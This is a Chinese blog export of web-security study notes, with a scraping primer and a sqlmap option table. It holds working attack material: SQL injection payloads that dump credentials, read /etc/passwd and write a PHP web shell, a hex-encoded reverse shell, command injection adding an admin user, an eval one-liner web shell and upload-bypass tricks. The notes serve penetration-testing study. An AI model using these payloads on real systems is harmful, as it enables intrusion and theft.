[{"title":"text","slug":"text","date":"03-31","updated":"03-31","comments":true,"path":"2019/03/31/text/","link":"","permalink":"148.70.147.195/index.html/2019/03/31/text/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"新的开始--爬虫基础","slug":"新的开始-爬虫","date":"03-24","updated":"03-25","comments":true,"path":"2019/03/24/新的开始-爬虫/","link":"","permalink":"148.70.147.195/index.html/2019/03/24/新的开始-爬虫/","excerpt":"","text":"python–爬虫入门(建议python2 kali linux自带) 在这里安利一下廖雪峰老师，不管是mysql，python，什么的都讲的究极好 python–商业爬虫 ######爬虫的强大作用在这里就不多言了，管他那么多，肝出来就完事了QAQ刚开始学爬虫这里先粘一张嘤嘤嘤的爬虫模板有这个参考入门会快很多 http: (1)当用户在地址输入了网址发送网络请求的过程 (2)请求方式get请求： 优点：比较便捷 缺点：不安全，参数长度有限制 post请求： 比较安全，数据整体没有限制，能上传文件 put（不完全的） delete（删除一些信息） head（请求头） 发送网络请求（需要带一定的数据给服务器） ↑放在请求头里 requestheader ![](https://s2.ax1x.com/2019/03/24/AY51VU.png) Accept：文本格式 Accept·Encoding：编码格式 connection：长连接，短链接 cooklie：缓存(服务器是别访问用户的唯一凭证) 服务器会返回数据：response header 爬虫入门：使用代码模拟用户批量发送网络请求批量获取数据 1爬虫的价值：1买卖数据（高端领域价格贵） 2数据分析 3流量 2合法性:灰色产业没有相关法律规定 公司概念：爬取数据库（窃取商业机密）！违法 3只能爬去用户能访问到的数据 4爬虫的分类：通用爬虫 使用搜索引擎搜索东西 优势：开放性好，速度快 劣势：目标不明确，返回内容很多用户不需要 聚焦爬虫（也就是接下来学习的） 优点：目标明确，清楚用户需求，返回内容固定 增量式：从第一页请求到最后一叶 Deep：深度爬虫：爬取静态数据：html，css 动态数据：js 加密js robots：是否允许其他爬虫（通用爬虫）爬去某些内容 聚焦爬虫不遵守robots 反爬虫：干掉用户 爬虫和反爬虫做斗争：资源对等情况下胜利者永远是爬虫 爬虫的工作原理： 1 确认抓取目标的url 2 使用python代码发送请求数据（java Go） 3 解析获取到的精准数据 4 数据持久化（保存） python3（原生提供的模块）：urlib.request python2 (原生提供的)：urlib2 5 request（第三方） 6 数据解析：xpath bs64 7 数据存储 尝试爬一下123456789101112131415161718192021222324252627282930#!/usr/bin/env python# -*- coding:utf-8 -*-# author: huahua time:2019/3/25import urllib.requestdef load_data(): url = &quot;http://www.baidu.com/&quot; # get请求 # http请求 # reponse:http响应对象 response = urllib.request.urlopen(url) print(response) # 读取内容 bytes类型 data = response.read() print(data) #将文件获取的内容转换成字符串 str_data = data.decode(&quot;utf-8&quot;) print(str_data) #将数据写入到文件 with open(&quot;baidu.html&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)as f: f.write(str_data) # 将字符串类型转换成bytes str_name = &quot;baidu&quot; bytes_name = str_name.encode(&quot;utf-8&quot;) print(bytes_name) #python 爬取的类型：str bytes #如果爬取的是bytes类型：但是你写入的时候需要字符串 decode(&quot;utf-8&quot;) #如果爬取的是str类型：但是你要写入的是bytes类型 encode（&quot;utf-8&quot;）load_data() 两下123456789101112131415161718192021222324252627282930#!/usr/bin/env python# -*- coding:utf-8 -*-# author: huahua time:2019/3/25import urllib.requestdef load_data(): url = &quot;http://www.baidu.com/&quot; # get请求 # http请求 # reponse:http响应对象 response = urllib.request.urlopen(url) print(response) # 读取内容 bytes类型 data = response.read() print(data) #将文件获取的内容转换成字符串 str_data = data.decode(&quot;utf-8&quot;) print(str_data) #将数据写入到文件 with open(&quot;baidu.html&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)as f: f.write(str_data) # 将字符串类型转换成bytes str_name = &quot;baidu&quot; bytes_name = str_name.encode(&quot;utf-8&quot;) print(bytes_name) #python 爬取的类型：str bytes #如果爬取的是bytes类型：但是你写入的时候需要字符串 decode(&quot;utf-8&quot;) #如果爬取的是str类型：但是你要写入的是bytes类型 encode（&quot;utf-8&quot;）load_data()","categories":[],"tags":[]},{"title":"参数表","slug":"参数表","date":"03-23","updated":"03-23","comments":true,"path":"2019/03/23/参数表/","link":"","permalink":"148.70.147.195/index.html/2019/03/23/参数表/","excerpt":"","text":"# Request 1 2 –method=METHOD 强制使用给定的HTTP方法（例如PUT） –data=DATA 通过POST发送的数据字符串（例如“id=1”） –param-del=PARA .. 用于分割参数值的字符（例如＆） –cookie=COOKIE HTTP Cookie标头值（例如“PHPSESSID=a8d127e ..”） –cookie-del=COO .. 用于分割cookie值的字符（例如;） –load-cookies=L .. 包含Netscape / wget格式的cookie的文件 –drop-set-cookie 从响应中忽略Set-Cookie标头 –user-agent=AGENT HTTP User-Agent标头值 –random-agent 使用随机选择的HTTP User-Agent标头值 –host=HOST HTTP主机头值 –referer=REFERER HTTP Referer标头值 -H HEADER， - .. 额外标题（例如“X-Forwarded-For：127.0.0.1”） –headers=HEADERS 额外标题（例如“Accept-Language：fr \\ nETag：123”） –auth-type=AUTH .. HTTP身份验证类型（Basic，Digest，NTLM或PKI） –auth-cred=AUTH .. HTTP身份验证凭据（名称：密码） –auth-file=AUTH .. HTTP身份验证PEM证书/私钥文件 –ignore-code=IG .. 忽略（有问题）HTTP错误代码（例如401） –ignore-proxy 忽略系统默认代理设置 –ignore-redirects 忽略重定向尝试 –ignore-timeouts 忽略连接超时 –proxy=PROXY 使用代理连接到目标URL –proxy-cred=PRO .. 代理身份验证凭据（名称：密码） –proxy-file=PRO .. 从文件加载代理列表 –tor 使用Tor匿名网络 –tor-port=TORPORT 设置Tor代理端口，而不是默认值 –tor-type=TORTYPE 设置Tor代理类型（HTTP，SOCKS4或SOCKS5（默认）） –check-tor 检查Tor是否正确使用 –delay=DELAY 每个HTTP请求之间的延迟（以秒为单位） –timeout=TIMEOUT 在超时连接之前等待的秒数（默认为30） –retries=RETRIES 连接超时时重试（默认值为3） –randomize=RPARAM 随机更改给定参数的值 –safe-url=SAFEURL 在测试期间经常访问的URL地址 –safe-post=SAFE .. POST数据发送到安全的URL –safe-req=SAFER .. 从文件加载安全的HTTP请求 –safe-freq=SAFE .. 在两次访问给定安全URL之间测试请求 –skip-urlencode 跳过有效载荷数据的URL编码 –csrf-token=CSR .. 用于保存反CSRF令牌的参数 –csrf-url = 要访问的CSRFURL URL地址，用于提取反CSRF令牌 –force-ssl 强制使用SSL / HTTPS –chunked 使用HTTP分块传输编码（POST）请求 –hpp 使用HTTP参数污染方法 target 1 2 -d DIRECT用于直接数据库连接的连接字符串 -u URL， - url=URL目标URL（例如“Http://wWw.site.com/vuln.php?id=1”） -l LOGFILE 从Burp或WebScarab代理日志文件中解析目标 -x SITEMAPURL 从远程站点地图（.xml）文件中解析目标 -m BULKFILE 扫描文本文件中给出的多个目标 -r REQUESTFILE 从文件加载HTTP请求 -g GOOGLEDORK 处理Google dork结果作为目标URL -c CONFIGFILE 从配置INI文件加载选项 Optimization 1 2 -o 打开所有优化开关 –predict-output 预测常见查询输出 –keep-alive 使用持久性HTTP（s）连接 –null-connection 检索没有实际HTTP响应正文的页面长度 –threads=THREADS 最大并发HTTP请求数（默认值为1） Injection 1 2 -p TESTPARAMETER 可测试参数 –skip=SKIP 对给定参数的跳过测试 –skip-static 跳过测试参数似乎不是动态的 –param-exclude=.. Regexp从测试中排除参数（例如“ses”） –dbms=DBMS 强制后端DBMS提供值 –dbms-cred=DBMS .. DBMS身份验证凭据（用户：密码） –os=OS Force 后端DBMS操作系统提供的值 –invalid-bignum 使用大数字表示值无效 –invalid-logical 使用逻辑运算使值无效 –invalid-string 使用随机字符串使值无效 –no-cast 关闭有效负载转换机制 –no-escape 闭字符串转义机制 –prefix=PREFIX 注入有效负载前缀字符串 –suffix=SUFFIX 注入有效负载后缀字符串 –tamper=TAMPER 使用给定的脚本来篡改注入数据 Detection 1 2 –level=LEVEL 要执行的测试级别（1-5，默认值1） –risk =RISK 执行测试的风险（1-3，默认值1） –string=STRING 查询计算为True时要匹配的字符串 –not-string=NOT .. 查询计算为False时要匹配的字符串 –regexp=REGEXP Regexp 在查询被评估为True时匹配 –code=CODE HTTP代码，当查询被评估为True时匹配 –text-only 仅根据文本内容比较页面 –titles 仅根据标题比较页面 Techniques 1 2 –technique=TECH SQL注入技术（默认为“BEUSTQ”） –time-sec=TIMESEC 延迟DBMS响应的秒数（默认值为5） –union-cols=UCOLS 要测试UNION查询SQL注入的列范围 –union-char=UCHAR 用于强制列数的字符 –union-from=UFROM 表用于UNION查询SQL注入的FROM部分 –dns-domain=DNS .. 用于DNS渗透攻击的域名 –second-url=SEC .. 生成的页面URL搜索了二阶响应 –second-req=SEC .. 从文件加载二阶HTTP请求 Enumeration: 1 2 -a， - all 检索所有内容 -b， - banner 检索DBMS横幅 –current-user 检索DBMS当前用户 –current-db 检索DBMS当前数据库 –hostname 检索DBMS服务器主机名 –is-dba 检测DBMS当前用户是否为DBA –users 枚举DBMS用户 –passwords 枚举DBMS用户密码哈希值 –privileges 枚举DBMS用户权限 –roles 枚举DBMS用户角色 –dbs 枚举DBMS数据库 –tables 枚举DBMS数据库表 –columns 枚举DBMS数据库表列 –schema 枚举DBMS架构 –count 检索表的条目数 –dump 转储DBMS数据库表条目 –dump-all 转储所有DBMS数据库表条目 –search 搜索列，表和/或数据库名称 –comments 在枚举期间检查DBMS注释 -D DB DBMS 数据库进行枚举 -T TBL DBMS 数据库表进行枚举 -C 要枚举的COL DBMS数据库表列 -X EXCLUDE DBMS数据库标识符不枚举 -U USER DBMS用户枚举 –exclude-sysdbs 枚举表时排除DBMS系统数据库 –pivot-column=P .. 透视列名 –where=DUMPWHERE 在表转储时使用WHERE条件 –start=LIMITSTART 要检索的第一个转储表条目 –stop=LIMITSTOP 要检索的最后转储表条目 –first=FIRSTCHAR 首先查询要检索的输出字符 –last=LASTCHAR 要检索的最后一个查询输出字符 –sql-query = 要执行的QUERY SQL语句 –sql-shell 提示交互式SQL shell –sql-file=SQLFILE 从给定文件执行SQL语句 #Brute force: –common-tables检查公用表的存在 –common-columns检查公共列的存在","categories":[],"tags":[]},{"title":"sqlmap自动注入","slug":"sqlmap自动注入","date":"03-23","updated":"03-24","comments":true,"path":"2019/03/23/sqlmap自动注入/","link":"","permalink":"148.70.147.195/index.html/2019/03/23/sqlmap自动注入/","excerpt":"","text":"SQLMAP自动注入 1 Get方法 ·sqlmap -u “http://192.168.253.129/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=password&amp;user-info-php-submit-button=View+Account+Details&quot; -p username -f ·扫描URL列表文件 ·http://1.1.1.1/vuln1.php？q=foobar http://1.1.1.1/vuln3/id/1* -d “mysql://user:password@192.168.20.10:3306/dvwa” -f –users –banner –dbs –schema -a ·sqlmap -m list.txt 扫描Google的搜索结果 SQLmap.py -g &quot;inurl:\\&quot;php?id=1\\&quot;&quot; 常用的一些参数 作用 -a all –banner 目标是什么版本，什么信息的数据库 –dbs 所有数据库 -f 指纹，足迹 –force-ssl 实现对HTTPS的sql注入 -h/-hh 展示/详细展示帮助 -m list.txt -p 手动测是要测试的参数 –schema 源数据库(定义数据的数据) –users 所有数据库用户 –version 版本信息 2 POST方法 ·使用http请求文件 sqlmap -r request.txt ·使用 burpsuit log文件 sqlmap -l log.txt ·HTTPS ·sqlmap -u “https://127.0.0.1/a.php?id=1:8080&quot;--force-ssl参数参考表 3 request 方法·–user-agent –random.agent ·sqlmap检查user-agent中的注入点: level &gt;=3 ·APP/WAF/IPS/IDS/过滤异常user-agent时报错3.1 提交请求·Host 头 –host=”aaaaaaaaaa” –leval 5 –dbs host 头的注入漏洞只会存在于level 5（一般不常见） Refer 头：–refer ·level &gt;=3额外的header： –headers · 多个头提交。每个头单独一行用”\\”换行 (名称区分大小写) · sqlmap -u “http：//1.1.1.1/a.php?id=1” –headers=”host：Www.a.com\\nUser-Agent:yuanfh” ·method=GET/PPOST （不建议从高level检查”耗时且易发现”） -methord=GET/POST3.2 身份认证类型：Basic DIgest NTLMsqlmap -u “http**a.php?id=1”–auth-type Basic –auth-cred “user:pass”基于证书的认证–auth-cert（官方） / –auth-file (sqlmap -help)–auth-file=”ca.PEM”·含有私钥的PEM格式证书文件（仅支持）·PEM格式认证 ·Http（s）代理扫描时可能被服务器所发现，而被封。则可以用代理扫描·–proxy=”http：//127.0.0.1:8087”–proxy-cerd=”name:pass”–ignor-proxy (忽略系统级代理设置，常用于扫描本地网络目标)·sqlmap -u “http：//1.1.1.1/a.php?id=1”–proxy=”http：//127.0.0.1:8087”–dbs –delay·（延迟设置，减小被发现的几率）每次http（S）请求之间延迟时间，浮点数，单位为妙，默认无延迟–timeout·请求超时时间，浮点数，默认为30秒–retries超时重试次数 ，默认三次可以 参数 数值 or 参数=”数值“–randomize ·长度，类型与原始值保持一致的情况下，指定每次请求随机取值的参数名称 –scope ·过滤日志内容，通过正测表达式筛选扫描对象 ·sqlmap -l burp.log –sco=(www)?\\target\\.(com|net|org)” ·sqlmap -l 2.log –scope=”(19)?\\.168\\.20\\.(1|10|100)”level 3 –dbs –safe-url / –safe-freq ·检测和盲注阶段会产生大量失败请求，服务器段可能因此销毁session ·每发送–safe-freq次注入请求后发送一次正常请求 –skip-urlncode ·默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据 –eval 每次请求 执行指定的python代码 每次请求更改或者增加新的参数值（时间依赖，其他参数值依赖） sqlmap -u “http：//1.1.1.1/a.php?id=1&amp;hash=密文密码”–eval=“import hashlib;hash=hashlib.md5(id).hexdigest()” 4 OPTIMIAZATION 优化性能 –predict-output ·根据检方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率 ·版本名，用户名，密码，Privilieges，role,数据库名称，表名，列名 ·与threads参数不兼容 ·统计表：/user/share/sqlmap/txt/common-outputs。txt –keep-alive ·使用http（s）长连接，性能好 ·与proxy参数不兼容 ·长连接避免你重复建立连接的网络开销，但大量长连接会占用服务器资源 –null-connection · 只获取相应页面大小值而非页面具体内容 ·通常只用于盲注判断（真假），降低网络带宽消耗 ·与–text-only参数不兼容（基于页面内容比较判断 真/假） –threads ·最大并发线程 ·盲注时每个线程获取一个字符（7次请求），获取完成后线程结束 ·默认值为1，建议不要超过10 ，否则可能影响站点可用性 ·与 –predict-output参数不兼容 -o 开启前三个性能参数（除–threads参数）","categories":[],"tags":[]},{"title":"SQL-注入","slug":"SQL-注入","date":"03-19","updated":"03-24","comments":true,"path":"2019/03/19/SQL-注入/","link":"","permalink":"148.70.147.195/index.html/2019/03/19/SQL-注入/","excerpt":"","text":"手动漏洞挖掘-sql注入服务器端程序将用户输入参数作为查询条件，直接拼接SQl语句并将查询结果返回给客户浏览器 用户登录判断·SELECTFROM users WHERE user= ‘uname ‘ AND password=’pass’·SELECTFROM users WHERE user=’name’ AND password=’’ OR ‘’=’’·基于报错的检测方法· ‘ % （）·基于布尔的检测方法1 ‘ and ‘1 ‘= ‘1 / 1 ‘ and ‘11 ‘and ‘1 ‘= ‘2 / 1 ‘and ‘0判断查询字段并搞清楚位置表列数 ‘order by 9– #按查询列号排序· select + 时刻字段数=查询字段数· 联合查询（多条查询语句同时执行）· ‘union select 1.2–· ·union all select database().2–DB用户 ： user（）DB版本 ; version()‘union select databnase() , substring_index(user(),”@”,1)#（把查询函数切分）全局函数 ： @@datadir（当前数据库所在位置），@@hostname（主机名）,@@VERSION，@@VERSION_compile_os （操作系统版本）当前库： database()·ASCLL转字符：char() 分隔链接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())计算哈希：md5() Mysql 数据结构·information_schema·所有库所有表/统计每库中表的数量union select table_name,table_schema,from information_schema.tables#（查所有表）UNION select table schema.count() FROM information_Schema.tables group by table_schema#（查表名） Dvwa库中的表名·union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’#(按表名查询) 查询user,password 列的内容·union select user,password from dvwa.users#·union select user,password from users#·union select null,CONCAT(user(),0x3a,password) from users# 破解MD5username:passhas——–&gt;hashtestjohn –format=raw-MD5 hashtest –shousqlmap -d “mysql://root:@192.168.177.129:3306/dvwa” -a 读写文件和下载数据库读取文件‘union select null,LOAD_file(‘/etc/passwd’)# 写入文件 ‘union select null,”&lt;?php passthtu $_ GET[‘cmd’]);?&gt;”INTO DUMPFILE”/var/www/a.php可能会出发过滤机制用16进制编码kali实操拷贝一个反弹shellcp /usr/share/webshell/php/ →reverse-shell.php/b.phpvi b.php 把ip改成目标ip 对b.php编码cat b.php | xxd &lt;–(16进制编码) -ps（会以固定长度编译，换行符mysql无法理解）用| tr -d ‘\\n’复制下编码内容注入到语句中去（0x编码内容）·Mysql账号cat php-revers-shell.php|xxd -ps | tr -d ‘\\n’(反弹shell) 保存下载数据库union select null,(0x3a,password) from users INTO OUTFILE’/tmp/a.db’#(脱库到目标服务器的本地目录，在通过url下载) 一个思路：编写服务器代码举个例子：（上传的webshell收到限制没什么用）变换一个思路了解目标服务器结构等等，直接写一段代码执行命令如上图可以创建一个表单添加一个用户现在的加密破解难度极大，效率低，可以变通思路，直接更改数据库内容，或添加高权限管理员 ps 建议在kali装上professional的burp suite 当无权读取information_schema库 / 拒绝union、order by语句时 猜列名： ‘ and column is mull# ·Burpsuite 自动猜列名 猜当前表表名： ‘and table.user is null# 猜库里其他表名： ‘and (select*from table)&gt;0# 列表对应关系：’and users.user is null# 猜字段关系： ‘or user=’admin&apos;or user like &apos;%a% 猜账号对应密码：’or user=’admin’ and password=’密码当数据可写 · ‘:updat user set user=’yuanfh’ where user=’admin“;”可以并列多条数据库语句· INSERT INTO users（’user_id’,’first name’,’last_name’,’）user’,’password’,’avatar)VALUES(‘35’,’fh’,’yuan’,’密码’,’OK’);#‘;DROP TABLE users；#xp_cmdshell/ 储存过程·SQLi没有通用的方法，要领就是掌握原理，了解各种数据库特性 sql注入-DVWAmedium难度级别和high难度区分上面两张图就是medium和low的区别mysql_real_escape_string()”在php5.5弃用”在php7.0删除此语句，代之以MysqlLi，PDO_MySQlmedium在low的基础上增加了一句过滤语句，是PHP的集成语句，能实现特殊字符的转译 “\\,’,”,\\n,\\r,\\xla”下面看一下high改动的代码一个数字检查就无法注入select语句了 sql 盲注不显示数据库内建的报错信息 ·内建的报错信息帮助开发人员发现和修复问题 ·报错信息提供关于系统的大量有用信息当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果即盲注 思路：既然无法基于报错信息报错信息判断结果，基于逻辑真假的不同结果来判断· 1’and 1=1#· 1’and 1=2#猜列名 ： 1’and table.user is not null#猜库里其他表：1’and (select count() from table)&gt;0#列对应关系 1’and users.user is not null#猜字段内容：1’and user=’admin 1’or user like ‘%a%·猜账号对应密码： ·2’ or user=’admin’and password=’密码 ·burpsuit自动化猜解 ·打开脑洞，注入的方式多种多样真实案例：某电商网站 http://1.1.1.1/goods.php?cnt&amp;goodsid=123·and 1=1# 显示一包面巾纸·and 1=2# 显示一包洗衣粉工具未扫到漏洞，于是人工拼接了下列语句 ↓截取第一个字符 · 1’and ORD(MID((version()),1,1))&amp;1&gt;0# 得到ASCLL码↑ ↑从字符串截取 ↑查询版本信息· CURRENT_USER()、DATABASE()· MID(ColumName,Start[,Length])·ORD(string)&amp;32 跟上的对应的字符的ascll码的32所在的位的值1(128) 1(64) 1(32) 1(16) 1(8) 1(4) 1(2) 1(1)依次查询就可以的到对应的ascll码进而得到所有信息. SQLMAP自动注入 简介 ·开源sql注入漏洞检测，利用工具 ·检测动态页面中get/past参数、cookie、http头 ·数据榨取 ·文件系统访问 ·操作系统命令执行 ·引擎强大、特性丰富 ·Xss漏洞检测 五种漏洞检测技术 基于布尔的盲注检测。(详见手动注入) 基于时间的盲注检测。· ‘and (select*from(select(sleep(20)))a)#↑等待20s再执行 基于错误的检测 基于UNION的联合查询检测 ·适用于通过for循环直接输出联合查询结果，否则只显示第一项结果 基于堆叠的查询检测·通过；堆叠多个查询语句·适用于非slect的数据修改，删除操作· 支持的数据库管理系统DBMS·MySWQL，Oracle，PostgerSQL，Microft SQL，Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB. 其他特性 ·数据库直连 -d ·不通过SQL注入，指定身份认证信息，ip，端口 ·与Burp suit，Google 结合使用，支持政策表达式限定测试目标 ·Get，past，cookie，referer，User-Agent（随机或指定） ·cookie过期后自动处理Set-Cookie头，更新cookie信息 ·限速：最大开发 延迟发送 ·支持Basic，Digest，NTLM，CA身份认证 ·数据库版本，用户权限hash枚举和字典破解，暴力破解表列名称 ·文件上传下载，UDF，启动并执行储存过程，操作系统命令执行，访问windows注册表 ·与w3af，metaspolit集成结合使用，基于数据库服务进程提权和上传执行后门","categories":[],"tags":[]},{"title":"web安全入门第五天","slug":"web安全入门第五天","date":"03-19","updated":"03-20","comments":true,"path":"2019/03/19/web安全入门第五天/","link":"","permalink":"148.70.147.195/index.html/2019/03/19/web安全入门第五天/","excerpt":"","text":"综合场景渗透与渗透测试流程 入门篇的渗透工具和渗透方式大概就介绍完了，今天介绍一下综合的流程思路什么的后面应该就会开展专题的渗透学习了还是说一下什么是渗透测试：“从攻击者的角度审核网络系统安全过程 使用黑客手段发现系统漏洞帮助系统管理员知道面临的威胁，以便采取必要的防范措施”目的是为了发现漏洞，数据泄漏获取权限以及更深入的目标，学安全学的第一句话就是(人品第一，技术第二)就不要想着去干坏事啊。 发现漏洞： 手工测试 漏洞扫描 利用漏洞： 获取数据 获得权限（权限）主要对象-目标信息系统组成操作系统：WINDOWS，SOLARIS，AIX，LINUX，CSO，SGI等操作系统网络结构：路由器，交换机和防火墙等设备组成的网络结构应用系统：web应用，数据库，FTP等数据类容：数据库，敏感文件类容 渗透方式 3.1 前期交互方案制定,确认渗透测试目标梳理思路 3.2 信息搜集：根据搜集到的信息，分析系统脆弱性，制定攻击模型，清理共攻击思路 信息搜集 目标：web应用信息，操作系统与服务 网络结构 ·web 服务器网络信息 ·web服务器c段 ·web服务器防护情况 ·web应用程序信息 ·web应用中间件 ·web应用使用的框架模板 ·web应用路径信息 ·web应用的敏感文件 ·web应用使用的第三方插件 ·web应用程序域名信息： ·whois注册信息 ·web应用程序子域名 ·nx记录 mx记录 ·web应用程序其他信息 ·网站客服信息（qq，邮箱，电话） ·网站所属公司信息 ·网站员工敏感信息 ·公众号，app ·web应用程序信息 中间件信息 ·判断网站是否采用了框架搭建？ 3.3 漏洞发现：根据上一步建立威胁模型，展开漏洞测试 漏洞利用（不同的目标与路线对应不同的方向）：或去数据-SQL注入，敏感信息泄露获得权限-上传命令注入等 权限提升获取web服务器最高权限，获取域控制权 提权与密码破解 ·第三方组建提权 ·文件系统权限配置不当 pr提权的漏洞全称是Microsoft Windows RPCSS服务隔离本地权限提升漏洞。微软发布的漏洞公告是MS09-012（KB952004），对应的CVE-2009-0079 mimikatz 可以直接获取到windows平台下的明文密码，相比于其他工具最大的特点是速度极快 原理是从lsall。exe进程中直接获取密码进行破解，而且破解方式不是穷举而是反向计算·脏牛提权 Linux 内核的内存子系统在处理写入时复制（copy-on-write,cow）时产生了竞争条件（race condition）。 mysql udf提权 ·MD5破解：stfw 总结与报告输出：总结漏洞情况，发现漏洞的详细过程，漏洞修补方案； 至此web入门就大概这样了，对渗透有了一些初步认识，接下来就是专题的学习了留一个空连接","categories":[],"tags":[]},{"title":"web安全入门第4天","slug":"web安全入门第4天","date":"03-19","updated":"03-24","comments":true,"path":"2019/03/19/web安全入门第4天/","link":"","permalink":"148.70.147.195/index.html/2019/03/19/web安全入门第4天/","excerpt":"","text":"很常见的漏洞xss漏洞（跨站脚本攻击）由于浏览器工作机制差不多：解析渲染web中间件响应的html语言等所以xss使用范围极广服务器与网站建立的联系是一次性的，为了让浏览器再次访问是能被服务器‘认出来’，服务器就会给浏览器发一个cookie(本地保存的密码实际上就是保存cookie)作为辨认标识，也是识别身份的唯一凭证可以通过在地址栏输入javascript:(document.cookie)查询。危害很大·窃取cookie ·DDoS攻击 ·网页挂马 ·提升用户权限 ·获取客户端信息 ·传播跨站脚本蠕虫 ·劫持用户会话·强制弹出广告页面 ·任意窜改页面信息xss攻击一般分为三种 反射型xss 一次性攻击 存储型xss 如果服务器打开新的网的时候调用了含有恶意js脚本的网站所有访问的浏览器都会执行 DOM型特殊类型的反射型xss，但不需要和服务器进行交互 xss漏洞发现和利用反射性xss可以在源码查看关键变量eg： alart(“我的人生没有故事只有一个帅字贯穿始终”)或者&lt;img src=0 onerrow alart(‘xss’)&gt;提交则会弹窗储存型xss和反射型差不多不过会长期保存Dom不太明白就不多说了 xss自动化测试常见 ·awvs ·appscan ·w3af ·xsser ·xssf如果发现了xss漏洞，那么我们可以结合一些xss工具来利用。常见的css利用工具有下面几个·BlueLotus——XSSReceiver搭建的XSS平台·XSSer.me源代码搭建的XSS平台·kali下的BeEf CSrf（跨站请求伪造）！csrf 常与xss混合使用原理：web应用程序在用户进行敏感操作时，如修改账号密码，添加账号，转账等，没有校验表单token或者http请求头中的referer值，被恶意利用完成恶意请求 目录遍历漏洞目录遍历漏洞是应为Web中间件与网站目录权限配置不当。在网站目录无索引文件（index.html,index.asp,index.php,index.jsp）的情况下访问改网站会直接显示该目录下所有文件及其子目录。通过web中间件进行正确的配置，可以由效避免这些漏洞。可以手工测试，也可以用自动化扫描器（awvs，w3af，APPscan）可以得到很多信息 信息泄露漏洞，任意文件读取漏洞（简单介绍一下）信息泄露web服务器敏感信息泄露端口 ：服务类型 开放服务版本。中间件敏感信息泄露 ：中间件类型 版本 后台地址。web应用程序信息泄露。web应用程序脚本程序版本。web应用程序开发框架。web应用程序cms类型。web应用程序后台地址 敏感目录 api等。安装目录信息。开发遗留文件。第三方插件。的whois信息。 防御方式：修改默认端口 屏蔽安装的服务的版本信息，修改对web中间件默认的后台地址 任意文件读取配置不当且没有对用户下载的文件参数进行有效的过滤，恶意用户就可以获取任意文件如web数据库的账号密码等。如果网站提供的链接形如：·readfile.php?file= .txt·download.php?file= .rar或者参数名为：·realPath=·filePath=·inputfile=则多半是可利用的目录遍历漏洞尝试下载网站的索引文件index文件，下载文件本身，下载爬虫都可以利用。","categories":[],"tags":[]},{"title":"web安全入门第三天","slug":"web安全入门第三天","date":"03-19","updated":"03-24","comments":true,"path":"2019/03/19/web安全入门第三天/","link":"","permalink":"148.70.147.195/index.html/2019/03/19/web安全入门第三天/","excerpt":"","text":"简单的sql注入原理都和其他渗透方式差不多，都是未将用户提供的参数和查询代码隔离。常见几种注入方式：整形注入；字符型注入；基于错误显示的sql注入；union型sql注入；布尔型注入；基于时间的sql注入web后端数据库一般有Mysql，SQLServer，Oracle，Access， 因为没有细致的展开去学，这里也不过多介绍，后面学了会补上博客连接注入的基本思路：·判断是否为动态网站，注入点仅存于动态网站；·判断是否有注入点·手工或者通过工具查看数据库信息·获取敏感信息，密码等 常见手工注入语句：‘ and ’1‘=’1 ；‘ and ’1‘=’2查询列数的语句： order by n （超出列数会执行错误）union(联合查询可以和多条select语句共同起作用)判断数据显示点 union select 1，2，3，N查看数据库基本信息version（），database（）查看数据库有哪些表union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’查看对应表有那些列union select 1,2,group_contacat(column_name)from information_schema.clumns where table_name= ‘users’查看账号密码信息union select 1,group_concat(username),group_concat(password) from users最常用的工具就是SQL map了，上手也快功能强大进阶版 命令注入漏洞有些网站可以提ping功能，但是如果缺少一些过滤保护，那么就能通过一些特殊的指令让其执行恶意命令命令的权限取决于web中间件的权限举个简单的例子 ping 127.0.0.1 &amp;&amp; net user admin password /add就可以通过命令添加一个新的admin管理员常见下面的命令： ·for windows ping 测试网络连通性 netstart 查看网络端口及连接状态 net user 查看增加删除当前系统账号 net localgroup 查看增加删除当前系统账号 net localgroup 查看增加删除当前系统用户组 dir 当前目录下的文件和子目录信息 req 注册表及相关操作 systeminfo 查看当前计算机的综合信息 tasklist 显示当前运行的进程信息 ·多条语句执行语法格式语句1 &amp; 语句2 : 执行1后执行2语句1 &amp;&amp; 语句2 : 执行1成功后执行2语句1 &#124;&#124;语句2 : 执行1失败后执行2语句1 &#124;语句2 : 把1的执行结果传递给2 ·for linux ifconfig 查看当前ip，mac等信息 netstat 查看网络开放端口及连接状态 whoiam 查看当前用户 cat /etc/passwd 查看所有用户信息 ls 查看当前目录下的文件和子目录信息 useradd 添加账户 userdel 删除账户 passwd 修改账户密码 命令注入一般流程","categories":[],"tags":[]},{"title":"web安全入门第二天","slug":"web安全入门第二天","date":"03-18","updated":"03-24","comments":true,"path":"2019/03/18/web安全入门第二天/","link":"","permalink":"148.70.147.195/index.html/2019/03/18/web安全入门第二天/","excerpt":"","text":"web威胁概述OWASP top-ten： open web application security project开放式web应用程序安全项目 ####Webshell(就是木马后门（php，jsp等）) 一句话木马：代码简单，通过webshell工具可以实现强大的功能php： eval 函数前一天有讲到http的get 和post 的请求方式这里$_POST php超全局变量$_GET和$_POST用于收集表单数据（from-data）eg：eval ($_POST[‘cmd’]);其他webshell 大马不需要菜刀等工具本身有各种类型的集成代码 文件上传漏洞直接上传webshell控制服务器原理 未将web应用程序与用户提交文件隔离上传流程：前端校验 http传输 web应用程序校验 web应用储存 web应用解析运行任意文件上传漏洞：开发人员测试代码没删除，上传文件经过压缩编码 ，通过特定的客户端上传，如app逃过js校验上传绕过方法 ：修改前端JS代码 、改包后i段上传校验绕过一般校验字段绕过扩展名的校验绕过黑名单PHP php5,php6,php加空格，phtml，PhP（大小写混合）ASP：aspx，cer，cdx，aSp（大小写混合）JSp：jspx,jspfJsP(大小写混合) 绕过头文件校验文件上传漏洞00截断在上传文件时web在某些版本下遇到\\x00字符后会截断路径名，测试人员通过构造韩、x00的特殊文件名就可以通过上传文件名的扩展名校验，但在保存时却以非法扩展名保存文件例如test.php\\x00.jpg 